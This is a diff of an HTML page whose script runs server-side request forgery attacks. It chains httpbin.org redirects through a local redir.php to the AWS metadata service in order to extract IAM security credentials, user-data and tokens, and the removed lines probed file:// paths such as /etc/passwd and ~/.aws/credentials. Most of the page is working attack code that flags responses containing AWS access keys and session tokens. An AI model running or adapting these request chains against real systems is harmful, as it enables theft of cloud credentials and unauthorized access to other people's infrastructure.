@@ -1,80 +1,79 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>AWS Token Extraction</title>
+    <title>Double Redirect AWS Attack</title>
 </head>
 <body>
-    <h1>🔐 AWS Metadata Token Extraction</h1>
+    <h1>🔗 Double Redirect AWS Metadata Attack</h1>
     <div id="results"></div>
     
     <script>
         var results = "";
         
-        // Try to extract AWS metadata token using httpbin.org PUT capabilities
-        var tokenTests = [
-            // Try httpbin.org PUT to get AWS token
-            'http://httpbin.org/put',
-            'http://httpbin.org/anything',
-            'http://httpbin.org/post',
+        // Use the confirmed working chain: httpbin.org → 127.0.0.1/redir.php → AWS metadata
+        var doubleRedirectTests = [
+            // Chain 1: httpbin.org → localhost redir → AWS metadata root
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/',
             
-            // Try specific AWS token endpoints
-            'http://httpbin.org/redirect-to?url=http://169.254.169.254/latest/api/token',
-            'http://httpbin.org/redirect-to?url=http://169.254.169.254/latest/api/',
+            // Chain 2: httpbin.org → localhost redir → AWS IAM credentials
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
             
-            // Try localhost endpoints that might have tokens/credentials stored
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/token',
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/api/token',
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/.aws/',
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/aws/',
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/credentials.json',
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/config.json',
+            // Chain 3: httpbin.org → localhost redir → AWS v1 metadata (might not need token)
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/',
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/',
             
-            // Try common AWS credential file locations on localhost
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/var/www/html/.env',
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/home/ubuntu/.aws/credentials',
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/root/.aws/credentials',
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/etc/environment',
+            // Chain 4: Try older AWS API versions via double redirect
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/2007-01-19/meta-data/',
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/2008-02-01/meta-data/',
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/2009-04-04/meta-data/',
             
-            // Try to find if there are other services on localhost
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1:8080/',
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1:3000/',
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1:9000/',
+            // Chain 5: Try AWS user data via double redirect
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/user-data/',
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/user-data/',
             
-            // Try to access different paths on the main localhost service
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/index.php',
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php',
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/releasenotes.txt',
+            // Chain 6: Test if we can get AWS token via double redirect 
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/api/token',
             
-            // Try file:// protocol via httpbin.org redirect
-            'http://httpbin.org/redirect-to?url=file:///etc/passwd',
-            'http://httpbin.org/redirect-to?url=file:///proc/version',
-            'http://httpbin.org/redirect-to?url=file:///var/www/html/.env',
-            'http://httpbin.org/redirect-to?url=file:///home/ubuntu/.aws/credentials',
+            // Chain 7: Try direct role access (if we know role name)
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/S3Role',
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2Role',
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/DefaultRole',
+            
+            // Chain 8: Test other internal services via double redirect
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://localhost/',
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://localhost/secret/',
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://localhost/.env',
+            
+            // Chain 9: Try to confirm the redirector works with simple test
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://httpbin.org/get',
         ];
         
-        for(var i = 0; i < tokenTests.length; i++) {
+        for(var i = 0; i < doubleRedirectTests.length; i++) {
             try {
-                results += "<h3>🔍 " + (i+1) + ": " + tokenTests[i] + "</h3>";
+                results += "<h3>🔗 Chain " + (i+1) + ": " + doubleRedirectTests[i].split('127.0.0.1/redir.php?url=')[1] + "</h3>";
                 var xhr = new XMLHttpRequest();
-                xhr.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(tokenTests[i]), false);
+                xhr.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(doubleRedirectTests[i]), false);
                 xhr.send();
                 
                 if(xhr.responseText && xhr.responseText.trim().length > 5) {
-                    results += "<div style='background:#e8f5e8;padding:10px;border:2px solid green;'>✅ RESPONSE: " + xhr.responseText.length + " bytes</div>";
+                    results += "<div style='background:#e8f5e8;padding:10px;border:2px solid green;'>🎯 SUCCESS: " + xhr.responseText.length + " bytes</div>";
                     
-                    // Look for any AWS-related content
+                    // Look for AWS credentials
                     var text = xhr.responseText.toLowerCase();
-                    if(text.includes('aws_access_key') || text.includes('aws_secret') || text.includes('accesskeyid')) {
-                        results += "<div style='background:#ff0000;color:white;padding:10px;border:3px solid red;'>🚨 AWS CREDENTIALS DETECTED! 🚨</div>";
+                    if(text.includes('accesskeyid') || text.includes('secretaccesskey') || text.includes('sessiontoken')) {
+                        results += "<div style='background:#ff0000;color:white;padding:15px;border:3px solid red;'>🚨🚨🚨 AWS CREDENTIALS EXTRACTED! 🚨🚨🚨</div>";
                     }
-                    if(text.includes('token') || text.includes('session')) {
-                        results += "<div style='background:#ffa500;color:white;padding:8px;'>🔐 TOKEN/SESSION FOUND!</div>";
+                    if(text.includes('asia') && text.includes('secret') && text.includes('token')) {
+                        results += "<div style='background:#ff4500;color:white;padding:12px;border:3px solid orange;'>🔑 FULL AWS CREDENTIAL SET FOUND! 🔑</div>";
                     }
-                    if(text.includes('asia') || text.includes('akia') || text.includes('secret')) {
-                        results += "<div style='background:#74c0fc;padding:8px;'>🔑 CREDENTIAL PATTERN DETECTED!</div>";
+                    if(text.includes('s3role') || text.includes('ec2role') || text.includes('iam')) {
+                        results += "<div style='background:#ffa500;color:white;padding:8px;'>🎯 IAM ROLE DETECTED!</div>";
                     }
-                    if(text.includes('root:') || text.includes('ubuntu:') || text.includes('/bin/bash')) {
-                        results += "<div style='background:#9c88ff;padding:8px;'>📁 SYSTEM FILE ACCESS!</div>";
+                    if(text.includes('ami-') || text.includes('instance-') || text.includes('placement')) {
+                        results += "<div style='background:#74c0fc;padding:8px;'>☁️ AWS METADATA CONTENT!</div>";
+                    }
+                    if(text.includes('401') || text.includes('unauthorized')) {
+                        results += "<div style='background:#ffeaa7;padding:8px;'>⚠️ Still getting 401 (need different approach)</div>";
                     }
                     
                     results += "<div style='background:#f0f0f0;padding:10px;max-height:200px;overflow:scroll;font-size:10px;white-space:pre-wrap;word-wrap:break-word;'>" + xhr.responseText + "</div>";
